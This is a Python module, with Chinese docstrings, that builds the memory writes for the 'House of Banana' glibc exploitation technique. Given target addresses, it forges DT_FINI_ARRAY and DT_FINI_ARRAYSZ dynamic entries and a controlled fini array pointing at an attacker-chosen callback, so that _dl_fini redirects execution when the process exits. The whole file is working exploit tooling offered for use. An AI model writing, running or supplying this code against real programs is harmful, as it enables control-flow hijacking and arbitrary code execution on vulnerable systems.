"""House of Banana DT_FINI_ARRAY consumption plan."""
from dataclasses import dataclass

@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str

def _p(v: int) -> bytes:
    if not isinstance(v, int) or not 0 <= v < 1 << 64: raise ValueError("value must fit uint64")
    return v.to_bytes(8, 'little')

def build_house_of_banana(*, fini_dyn_addr: int, fini_size_dyn_addr: int,
                          fini_array_addr: int, callback_addr: int,
                          link_map_base: int, array_count: int = 1) -> tuple[MemoryWrite, ...]:
    """生成 `_dl_fini` 消费 DT_FINI_ARRAY 所需的动态项和数组。

    fini_dyn_addr: `ElfW(Dyn)` 地址，tag 为 DT_FINI_ARRAY 的项。
    fini_size_dyn_addr: `DT_FINI_ARRAYSZ` 动态项地址。
    fini_array_addr: 进程中长期存活的 fini 函数数组地址。
    callback_addr: 数组元素调用地址；link_map_base: 对应 `l_addr`。
    array_count: 数组元素数量，按 glibc 以字节数保存到 `d_val`。
    """
    if array_count <= 0 or array_count >= 1 << 60: raise ValueError('invalid array_count')
    rel = fini_array_addr - link_map_base
    if not 0 <= rel < 1 << 64: raise ValueError('fini array is not representable relative to l_addr')
    dyn = bytearray(0x10); dyn[0:8] = (26).to_bytes(8, 'little'); dyn[8:16] = _p(rel)
    size_dyn = bytearray(0x10); size_dyn[0:8] = (28).to_bytes(8, 'little'); size_dyn[8:16] = (array_count * 8).to_bytes(8, 'little')
    array = _p(callback_addr) * array_count
    return (MemoryWrite(fini_dyn_addr, bytes(dyn), 'DT_FINI_ARRAY Dyn'),
            MemoryWrite(fini_size_dyn_addr, bytes(size_dyn), 'DT_FINI_ARRAYSZ Dyn'),
            MemoryWrite(fini_array_addr, array, 'controlled fini array'))
